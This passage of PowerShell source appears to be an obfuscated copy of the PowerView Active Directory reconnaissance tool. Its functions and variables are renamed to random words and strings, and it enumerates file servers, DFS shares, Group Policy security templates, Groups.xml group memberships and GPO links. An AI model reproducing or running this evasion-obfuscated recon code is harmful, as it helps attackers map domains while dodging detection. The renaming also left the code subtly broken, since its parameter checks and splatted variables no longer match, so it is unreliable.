        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function amphitheater {
            Param([String]$Path)
            if ($Path -and ($Path.split('\\').Count -ge 3)) {
                $Temp = $Path.split('\\')[2]
                if ($Temp -and ($Temp -ne '')) {
                    $Temp
                }
            }
        }
        $PPosolen99 = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            ForEach ($IayDthuO99 in $SSNUOPgW99) {
                $PPosolen99['Domain'] = $IayDthuO99
                $llxUonve99 = watersides @SearcherArguments
                $(ForEach($SPyFXTsh99 in $llxUonve99.FindAll()) {if ($SPyFXTsh99.Properties['homedirectory']) {amphitheater($SPyFXTsh99.Properties['homedirectory'])}if ($SPyFXTsh99.Properties['scriptpath']) {amphitheater($SPyFXTsh99.Properties['scriptpath'])}if ($SPyFXTsh99.Properties['profilepath']) {amphitheater($SPyFXTsh99.Properties['profilepath'])}}) | Sort-Object -Unique
            }
        }
        else {
            $llxUonve99 = watersides @SearcherArguments
            $(ForEach($SPyFXTsh99 in $llxUonve99.FindAll()) {if ($SPyFXTsh99.Properties['homedirectory']) {amphitheater($SPyFXTsh99.Properties['homedirectory'])}if ($SPyFXTsh99.Properties['scriptpath']) {amphitheater($SPyFXTsh99.Properties['scriptpath'])}if ($SPyFXTsh99.Properties['profilepath']) {amphitheater($SPyFXTsh99.Properties['profilepath'])}}) | Sort-Object -Unique
        }
    }
}
function wheezes {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [Switch]
        $rPozaKft99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        $qSIaVQrH99 = 'All'
    )
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        function nubile {
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Pkt
            )
            $bin = $Pkt
            $jENAJwFi99 = [bitconverter]::ToUInt32($bin[0..3],0)
            $KQJUFTqC99 = [bitconverter]::ToUInt32($bin[4..7],0)
            $KUsFrgdb99 = 8
            $WgKYvPMi99 = @()
            for($i=1; $i -le $KQJUFTqC99; $i++){
                $yoPETexz99 = $KUsFrgdb99
                $cBevlUSe99 = $KUsFrgdb99 + 1
                $ElHxYyAg99 = [bitconverter]::ToUInt16($bin[$yoPETexz99..$cBevlUSe99],0)
                $pOZfNqRy99 = $cBevlUSe99 + 1
                $jYvYrEsK99 = $pOZfNqRy99 + $ElHxYyAg99 - 1
                $RAYiDLuN99 = [System.Text.Encoding]::Unicode.GetString($bin[$pOZfNqRy99..$jYvYrEsK99])
                $HocljRhe99 = $jYvYrEsK99 + 1
                $xEFHwqMc99 = $HocljRhe99 + 3
                $WwMxAjSh99 = [bitconverter]::ToUInt32($bin[$HocljRhe99..$xEFHwqMc99],0)
                $MxxSmTdE99 = $xEFHwqMc99 + 1
                $FiBatLhP99 = $MxxSmTdE99 + $WwMxAjSh99 - 1
                $IefZOVjV99 = $bin[$MxxSmTdE99..$FiBatLhP99]
                switch -wildcard ($RAYiDLuN99) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        $QHDlpyqm99 = 0
                        $uCPmGFrs99 = 15
                        $EiTJlUhL99 = [byte[]]$IefZOVjV99[$QHDlpyqm99..$uCPmGFrs99]
                        $guid = New-Object Guid(,$EiTJlUhL99) # should match $dRGzfnnN99
                        $Irkdprij99 = $uCPmGFrs99 + 1
                        $VggmMYLD99 = $Irkdprij99 + 1
                        $rvnQHphg99 = [bitconverter]::ToUInt16($IefZOVjV99[$Irkdprij99..$VggmMYLD99],0)
                        $DEENosva99 = $VggmMYLD99 + 1
                        $qondLSBa99 = $DEENosva99 + $rvnQHphg99 - 1
                        $gPrWsTWy99 = [System.Text.Encoding]::Unicode.GetString($IefZOVjV99[$DEENosva99..$qondLSBa99])
                        $VPDGqLkL99 = $qondLSBa99 + 1
                        $vtgnYAHT99 = $VPDGqLkL99 + 1
                        $TCYuoXZB99 = [bitconverter]::ToUInt16($IefZOVjV99[$VPDGqLkL99..$vtgnYAHT99],0)
                        $HzCgdTte99 = $vtgnYAHT99 + 1
                        $mqYZnpnj99 = $HzCgdTte99 + $TCYuoXZB99 - 1
                        $OiuodTWG99 = [System.Text.Encoding]::Unicode.GetString($IefZOVjV99[$HzCgdTte99..$mqYZnpnj99])
                        $jmpdWhhC99 = $mqYZnpnj99 + 1
                        $pBrdrIOW99 = $jmpdWhhC99 + 3
                        $type = [bitconverter]::ToUInt32($IefZOVjV99[$jmpdWhhC99..$pBrdrIOW99],0)
                        $ZigGWLsa99 = $pBrdrIOW99 + 1
                        $eTUDuFyG99 = $ZigGWLsa99 + 3
                        $state = [bitconverter]::ToUInt32($IefZOVjV99[$ZigGWLsa99..$eTUDuFyG99],0)
                        $soumzfUU99 = $eTUDuFyG99 + 1
                        $FveDLHHq99 = $soumzfUU99 + 1
                        $jtdhZPca99 = [bitconverter]::ToUInt16($IefZOVjV99[$soumzfUU99..$FveDLHHq99],0)
                        $OKTMtSTT99 = $FveDLHHq99 + 1
                        $IkrgZLam99 = $OKTMtSTT99 + $jtdhZPca99 - 1
                        if ($jtdhZPca99 -gt 0)  {
                            $qLFuHKiz99 = [System.Text.Encoding]::Unicode.GetString($IefZOVjV99[$OKTMtSTT99..$IkrgZLam99])
                        }
                        $SmPXXMJs99 = $IkrgZLam99 + 1
                        $cxXlcgSb99 = $SmPXXMJs99 + 7
                        $qrbeZsyG99 = $IefZOVjV99[$SmPXXMJs99..$cxXlcgSb99] #dword lowDateTime #dword highdatetime
                        $EXwZUvSp99 = $cxXlcgSb99 + 1
                        $BbVpDcrZ99 = $EXwZUvSp99 + 7
                        $BNBOQUCG99 = $IefZOVjV99[$EXwZUvSp99..$BbVpDcrZ99]
                        $aArMZXnE99 = $BbVpDcrZ99 + 1
                        $KwnKUwJD99 = $aArMZXnE99 + 7
                        $KOvjuCsK99 = $IefZOVjV99[$aArMZXnE99..$KwnKUwJD99]
                        $OAxrgPSt99 = $KwnKUwJD99  + 1
                        $SsNqgRNc99 = $OAxrgPSt99 + 3
                        $qSIaVQrH99 = [bitconverter]::ToUInt32($IefZOVjV99[$OAxrgPSt99..$SsNqgRNc99],0)
                        $nuBBAaAf99 = $SsNqgRNc99 + 1
                        $DeueCIXC99 = $nuBBAaAf99 + 3
                        $SfvufjUQ99 = [bitconverter]::ToUInt32($IefZOVjV99[$nuBBAaAf99..$DeueCIXC99],0)
                        $eQwmRdlm99 = $DeueCIXC99 + 1
                        $MNLhUkCk99 = $eQwmRdlm99 + $SfvufjUQ99 - 1
                        $gHAhdaVY99 = $IefZOVjV99[$eQwmRdlm99..$MNLhUkCk99]
                        $DkDnngZI99 = $MNLhUkCk99 + 1
                        $rVkHixjD99 = $DkDnngZI99 + 3
                        $AueUiwBI99 = [bitconverter]::ToUInt32($IefZOVjV99[$DkDnngZI99..$rVkHixjD99],0)
                        $cgpbOLZt99 = $rVkHixjD99 + 1
                        $hnOfEhXU99 = $cgpbOLZt99 + $AueUiwBI99 - 1
                        $pPWFxVbM99 = $IefZOVjV99[$cgpbOLZt99..$hnOfEhXU99]
                        $pkuaSjLn99 = $hnOfEhXU99 + 1
                        $lqdAmDHt99 = $pkuaSjLn99 + 3
                        $OAmMnqTm99 = [bitconverter]::ToUInt32($IefZOVjV99[$pkuaSjLn99..$lqdAmDHt99],0)
                        $LJOuBZwq99 = 0
                        $bZYydlLz99 = $LJOuBZwq99 + 3
                        $AieGmuft99 = [bitconverter]::ToUInt32($gHAhdaVY99[$LJOuBZwq99..$bZYydlLz99],0)
                        $ukvFdusY99 = $bZYydlLz99 + 1
                        for($j=1; $j -le $AieGmuft99; $j++){
                            $vOAekUsn99 = $ukvFdusY99
                            $XNAyOfPa99 = $vOAekUsn99 + 3
                            $uPvgtagO99 = [bitconverter]::ToUInt32($gHAhdaVY99[$vOAekUsn99..$XNAyOfPa99],0)
                            $CZKXxXQX99 = $XNAyOfPa99 + 1
                            $UAuqRucg99 = $CZKXxXQX99 + 7
                            $NWNgTxpZ99 = $gHAhdaVY99[$CZKXxXQX99..$UAuqRucg99]
                            $cMcnARJB99 = $UAuqRucg99 + 1
                            $KVFaRWCH99 = $cMcnARJB99 + 3
                            $FjpOWYYD99 = [bitconverter]::ToUInt32($gHAhdaVY99[$cMcnARJB99..$KVFaRWCH99],0)
                            $EFjlvywl99 = $KVFaRWCH99 + 1
                            $jCDmjAdt99 = $EFjlvywl99 + 3
                            $WFzdaMIE99 = [bitconverter]::ToUInt32($gHAhdaVY99[$EFjlvywl99..$jCDmjAdt99],0)
                            $FVjSIZcL99 = $jCDmjAdt99 + 1
                            $QXMgYIyJ99 = $FVjSIZcL99 + 1
                            $oXkSRoAM99 = [bitconverter]::ToUInt16($gHAhdaVY99[$FVjSIZcL99..$QXMgYIyJ99],0)
                            $zaJZsGRN99 = $QXMgYIyJ99 + 1
                            $HgpNyBnp99 = $zaJZsGRN99 + $oXkSRoAM99 - 1
                            $kwscAjdo99 = [System.Text.Encoding]::Unicode.GetString($gHAhdaVY99[$zaJZsGRN99..$HgpNyBnp99])
                            $eldLsEpl99 = $HgpNyBnp99 + 1
                            $mwTZLmvo99 = $eldLsEpl99 + 1
                            $poTRdgZq99 = [bitconverter]::ToUInt16($gHAhdaVY99[$eldLsEpl99..$mwTZLmvo99],0)
                            $bPQRqisv99 = $mwTZLmvo99 + 1
                            $GSnYyCmM99 = $bPQRqisv99 + $poTRdgZq99 - 1
                            $yFJWGehh99 = [System.Text.Encoding]::Unicode.GetString($gHAhdaVY99[$bPQRqisv99..$GSnYyCmM99])
                            $RnyMvCme99 += "\\$kwscAjdo99\$yFJWGehh99"
                            $ukvFdusY99 = $GSnYyCmM99 + 1
                        }
                    }
                }
                $KUsFrgdb99 = $FiBatLhP99 + 1
                $HJllWECt99 = @{
                    'Name' = $RAYiDLuN99
                    'Prefix' = $gPrWsTWy99
                    'TargetList' = $RnyMvCme99
                }
                $WgKYvPMi99 += New-Object -TypeName PSObject -Property $HJllWECt99
                $gPrWsTWy99 = $Null
                $RAYiDLuN99 = $Null
                $RnyMvCme99 = $Null
            }
            $VEbLEAEn99 = @()
            $WgKYvPMi99 | ForEach-Object {
                if ($_.TargetList) {
                    $_.TargetList | ForEach-Object {
                        $VEbLEAEn99 += $_.split('\')[2]
                    }
                }
            }
            $VEbLEAEn99
        }
        function electronica {
            [CmdletBinding()]
            Param(
                [String]
                $SSNUOPgW99,
                [String]
                $FNgTGwmR99,
                [String]
                $mSxqoOjK99,
                [String]
                $vaSWXjPs99 = 'Subtree',
                [Int]
                $mhcqrrQn99 = 200,
                [Int]
                $mvTbAWDU99,
                [Switch]
                $rPozaKft99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $gxazvivN99 = [Management.Automation.PSCredential]::Empty
            )
            $GdhysMOY99 = watersides @PSBoundParameters
            if ($GdhysMOY99) {
                $poblVMMY99 = @()
                $GdhysMOY99.filter = '(&(objectClass=fTDfs))'
                try {
                    $pfqXXMQd99 = $GdhysMOY99.FindAll()
                    $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                        $SdzJuWMG99 = $_.Properties
                        $PTxpSoVG99 = $SdzJuWMG99.remoteservername
                        $Pkt = $SdzJuWMG99.pkt
                        $poblVMMY99 += $PTxpSoVG99 | ForEach-Object {
                            try {
                                if ( $_.Contains('\') ) {
                                    New-Object -TypeName PSObject -Property @{'Name'=$SdzJuWMG99.name[0];'RemoteServerName'=$_.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[wheezes] electronica error in parsing DFS share : $_"
                            }
                        }
                    }
                    if ($pfqXXMQd99) {
                        try { $pfqXXMQd99.dispose() }
                        catch {
                            Write-Verbose "[wheezes] electronica error disposing of the Results object: $_"
                        }
                    }
                    $GdhysMOY99.dispose()
                    if ($pkt -and $pkt[0]) {
                        nubile $pkt[0] | ForEach-Object {
                            if ($_ -ne 'null') {
                                New-Object -TypeName PSObject -Property @{'Name'=$SdzJuWMG99.name[0];'RemoteServerName'=$_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning "[wheezes] electronica error : $_"
                }
                $poblVMMY99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
        function inamoratas {
            [CmdletBinding()]
            Param(
                [String]
                $SSNUOPgW99,
                [String]
                $FNgTGwmR99,
                [String]
                $mSxqoOjK99,
                [String]
                $vaSWXjPs99 = 'Subtree',
                [Int]
                $mhcqrrQn99 = 200,
                [Int]
                $mvTbAWDU99,
                [Switch]
                $rPozaKft99,
                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                $gxazvivN99 = [Management.Automation.PSCredential]::Empty
            )
            $GdhysMOY99 = watersides @PSBoundParameters
            if ($GdhysMOY99) {
                $poblVMMY99 = @()
                $GdhysMOY99.filter = '(&(objectClass=msDFS-Linkv2))'
                $Null = $GdhysMOY99.PropertiesToLoad.AddRange(('msdfs-linkpathv2','msDFS-TargetListv2'))
                try {
                    $pfqXXMQd99 = $GdhysMOY99.FindAll()
                    $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
                        $SdzJuWMG99 = $_.Properties
                        $RnyMvCme99 = $SdzJuWMG99.'msdfs-targetlistv2'[0]
                        $xml = [xml][System.Text.Encoding]::Unicode.GetString($RnyMvCme99[2..($RnyMvCme99.Length-1)])
                        $poblVMMY99 += $xml.targets.ChildNodes | ForEach-Object {
                            try {
                                $qOvqvoXv99 = $_.InnerText
                                if ( $qOvqvoXv99.Contains('\') ) {
                                    $exPsVEUO99 = $qOvqvoXv99.split('\')[3]
                                    $cjvROwQJ99 = $SdzJuWMG99.'msdfs-linkpathv2'[0]
                                    New-Object -TypeName PSObject -Property @{'Name'="$exPsVEUO99$cjvROwQJ99";'RemoteServerName'=$qOvqvoXv99.split('\')[2]}
                                }
                            }
                            catch {
                                Write-Verbose "[wheezes] inamoratas error in parsing target : $_"
                            }
                        }
                    }
                    if ($pfqXXMQd99) {
                        try { $pfqXXMQd99.dispose() }
                        catch {
                            Write-Verbose "[wheezes] Error disposing of the Results object: $_"
                        }
                    }
                    $GdhysMOY99.dispose()
                }
                catch {
                    Write-Warning "[wheezes] inamoratas error : $_"
                }
                $poblVMMY99 | Sort-Object -Unique -Property 'RemoteServerName'
            }
        }
    }
    PROCESS {
        $poblVMMY99 = @()
        if ($PSBoundParameters['Domain']) {
            ForEach ($IayDthuO99 in $SSNUOPgW99) {
                $PPosolen99['Domain'] = $IayDthuO99
                if ($qSIaVQrH99 -match 'all|1') {
                    $poblVMMY99 += electronica @SearcherArguments
                }
                if ($qSIaVQrH99 -match 'all|2') {
                    $poblVMMY99 += inamoratas @SearcherArguments
                }
            }
        }
        else {
            if ($qSIaVQrH99 -match 'all|1') {
                $poblVMMY99 += electronica @SearcherArguments
            }
            if ($qSIaVQrH99 -match 'all|2') {
                $poblVMMY99 += inamoratas @SearcherArguments
            }
        }
        $poblVMMY99 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}
function Tuscon {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $CnoFYxhs99,
        [Switch]
        $sYroqMOX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ECmrxjxB99 = @{}
    }
    PROCESS {
        try {
            if (($CnoFYxhs99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $lnulgfng99 = "\\$((New-Object System.Uri($CnoFYxhs99)).Host)\SYSVOL"
                if (-not $ECmrxjxB99[$lnulgfng99]) {
                    distinctively -Path $lnulgfng99 -Credential $gxazvivN99
                    $ECmrxjxB99[$lnulgfng99] = $True
                }
            }
            $myGccuLL99 = $CnoFYxhs99
            if (-not $myGccuLL99.EndsWith('.inf')) {
                $myGccuLL99 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }
            Write-Verbose "[Tuscon] Parsing GptTmplPath: $myGccuLL99"
            if ($PSBoundParameters['OutputObject']) {
                $CMEVrSig99 = intriguingly -Path $myGccuLL99 -OutputObject -ErrorAction Stop
                if ($CMEVrSig99) {
                    $CMEVrSig99 | Add-Member Noteproperty 'Path' $myGccuLL99
                    $CMEVrSig99
                }
            }
            else {
                $CMEVrSig99 = intriguingly -Path $myGccuLL99 -ErrorAction Stop
                if ($CMEVrSig99) {
                    $CMEVrSig99['Path'] = $myGccuLL99
                    $CMEVrSig99
                }
            }
        }
        catch {
            Write-Verbose "[Tuscon] Error parsing $myGccuLL99 : $_"
        }
    }
    END {
        $ECmrxjxB99.Keys | ForEach-Object { reeling -Path $_ }
    }
}
function Peiping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Path')]
        [String]
        $wRjDwLau99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $ECmrxjxB99 = @{}
    }
    PROCESS {
        try {
            if (($wRjDwLau99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $lnulgfng99 = "\\$((New-Object System.Uri($wRjDwLau99)).Host)\SYSVOL"
                if (-not $ECmrxjxB99[$lnulgfng99]) {
                    distinctively -Path $lnulgfng99 -Credential $gxazvivN99
                    $ECmrxjxB99[$lnulgfng99] = $True
                }
            }
            [XML]$eODbVEwq99 = Get-Content -Path $wRjDwLau99 -ErrorAction Stop
            $eODbVEwq99 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {
                $SZjbzmKX99 = $_.Properties.groupName
                $LmXmVdGr99 = $_.Properties.groupSid
                if (-not $LmXmVdGr99) {
                    if ($SZjbzmKX99 -match 'Administrators') {
                        $LmXmVdGr99 = 'S-1-5-32-544'
                    }
                    elseif ($SZjbzmKX99 -match 'Remote Desktop') {
                        $LmXmVdGr99 = 'S-1-5-32-555'
                    }
                    elseif ($SZjbzmKX99 -match 'Guests') {
                        $LmXmVdGr99 = 'S-1-5-32-546'
                    }
                    else {
                        if ($PSBoundParameters['Credential']) {
                            $LmXmVdGr99 = gain -ObjectName $SZjbzmKX99 -Credential $gxazvivN99
                        }
                        else {
                            $LmXmVdGr99 = gain -ObjectName $SZjbzmKX99
                        }
                    }
                }
                $SvCMbRzc99 = $_.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $_.action -match 'ADD' } | ForEach-Object {
                    if ($_.sid) { $_.sid }
                    else { $_.name }
                }
                if ($SvCMbRzc99) {
                    if ($_.filters) {
                        $kqlIQisk99 = $_.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $_.LocalName;'Value' = $_.name}
                        }
                    }
                    else {
                        $kqlIQisk99 = $Null
                    }
                    if ($SvCMbRzc99 -isnot [System.Array]) { $SvCMbRzc99 = @($SvCMbRzc99) }
                    $gxgEsjTt99 = New-Object PSObject
                    $gxgEsjTt99 | Add-Member Noteproperty 'GPOPath' $dPbUrfIe99
                    $gxgEsjTt99 | Add-Member Noteproperty 'Filters' $kqlIQisk99
                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupName' $SZjbzmKX99
                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupSID' $LmXmVdGr99
                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupMemberOf' $Null
                    $gxgEsjTt99 | Add-Member Noteproperty 'GroupMembers' $SvCMbRzc99
                    $gxgEsjTt99.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $gxgEsjTt99
                }
            }
        }
        catch {
            Write-Verbose "[Peiping] Error parsing $dPbUrfIe99 : $_"
        }
    }
    END {
        $ECmrxjxB99.Keys | ForEach-Object { reeling -Path $_ }
    }
}
function roomfuls {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $BfpbWwpi99,
        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $HdCnajIa99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $rqcypngr99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSNUOPgW99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $HOOTOEqu99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $SdzJuWMG99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $FNgTGwmR99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $mSxqoOjK99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $vaSWXjPs99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $mhcqrrQn99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $mvTbAWDU99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $tmZARvdq99,
        [Switch]
        $rPozaKft99,
        [Alias('ReturnOne')]
        [Switch]
        $QtcSidjx99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $gxazvivN99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $PPosolen99 = @{}
        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
        if ($PSBoundParameters['SearchBase']) { $PPosolen99['SearchBase'] = $FNgTGwmR99 }
        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
        if ($PSBoundParameters['SearchScope']) { $PPosolen99['SearchScope'] = $vaSWXjPs99 }
        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
        if ($PSBoundParameters['SecurityMasks']) { $PPosolen99['SecurityMasks'] = $tmZARvdq99 }
        if ($PSBoundParameters['Tombstone']) { $PPosolen99['Tombstone'] = $rPozaKft99 }
        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
        $GDUlOJMy99 = watersides @SearcherArguments
    }
    PROCESS {
        if ($GDUlOJMy99) {
            if ($PSBoundParameters['ComputerIdentity'] -or $PSBoundParameters['UserIdentity']) {
                $bjrWoTvw99 = @()
                if ($PPosolen99['Properties']) {
                    $QEbPmGkV99 = $PPosolen99['Properties']
                }
                $PPosolen99['Properties'] = 'distinguishedname,dnshostname'
                $vnhDKlDn99 = $Null
                if ($PSBoundParameters['ComputerIdentity']) {
                    $PPosolen99['Identity'] = $HdCnajIa99
                    $cXOPCAwl99 = doubtlessly @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $cXOPCAwl99) {
                        Write-Verbose "[roomfuls] Computer '$HdCnajIa99' not found!"
                    }
                    $HxrwipaH99 = $cXOPCAwl99.distinguishedname
                    $vnhDKlDn99 = $cXOPCAwl99.dnshostname
                }
                else {
                    $PPosolen99['Identity'] = $rqcypngr99
                    $User = township @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $User) {
                        Write-Verbose "[roomfuls] User '$rqcypngr99' not found!"
                    }
                    $HxrwipaH99 = $User.distinguishedname
                }
                $Atridfde99 = @()
                $Atridfde99 += $HxrwipaH99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $HxrwipaH99.SubString($HxrwipaH99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[roomfuls] object OUs: $Atridfde99"
                if ($Atridfde99) {
                    $PPosolen99.Remove('Properties')
                    $HGtFWdRb99 = $False
                    ForEach($jfyKpQwz99 in $Atridfde99) {
                        $PPosolen99['Identity'] = $jfyKpQwz99
                        $bjrWoTvw99 += ivies @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $zsOmScFL99 = $Parts[1]
                                        if ($HGtFWdRb99) {
                                            if ($zsOmScFL99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $HGtFWdRb99 = $True
                            }
                        }
                    }
                }
                if ($vnhDKlDn99) {
                    $UFJqwyIQ99 = (tussled -ComputerName $vnhDKlDn99).SiteName
                    if($UFJqwyIQ99 -and ($UFJqwyIQ99 -notlike 'Error*')) {
                        $PPosolen99['Identity'] = $UFJqwyIQ99
                        $bjrWoTvw99 += shoddiness @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $RrtlyuUC99 = $HxrwipaH99.SubString($HxrwipaH99.IndexOf('DC='))
                $PPosolen99.Remove('Identity')
                $PPosolen99.Remove('Properties')
                $PPosolen99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$RrtlyuUC99)"
                $bjrWoTvw99 += farrowing @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[roomfuls] GPOAdsPaths: $bjrWoTvw99"
                if ($QEbPmGkV99) { $PPosolen99['Properties'] = $QEbPmGkV99 }
                else { $PPosolen99.Remove('Properties') }
                $PPosolen99.Remove('Identity')
